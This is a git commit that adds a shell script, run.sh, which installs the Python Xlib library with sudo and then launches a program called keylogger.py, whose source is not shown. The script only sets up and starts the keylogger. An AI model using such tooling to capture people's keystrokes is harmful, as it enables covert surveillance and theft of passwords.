e9c3663ba69eed11f32276d7eb478ad342c4e557
Sai Dheeraj <saidheeraj.kumar04@gmail.com>
2016-11-01 01:43:57 +0530

    Add Logs.txt and run.sh

---
+++ run.sh
@@ -0,0 +1,14 @@
+if [ "$(pydoc modules | grep 'Xlib')" == "" ]; then
+    echo "Installing Xlib......."
+    if [ "$(pydoc modules | grep 'setuptools')" == "" ]; then
+        echo "Installing setuptools......."
+        sudo apt-get install python-setuptools
+    fi
+    cd "python-xlib-0.17/" && sudo python setup.py install;
+    cd ..
+else
+    echo "Xlib installed already"
+fi
+sudo apt-get install python-setuptools
+echo "starting key logger....."
+python keylogger.py
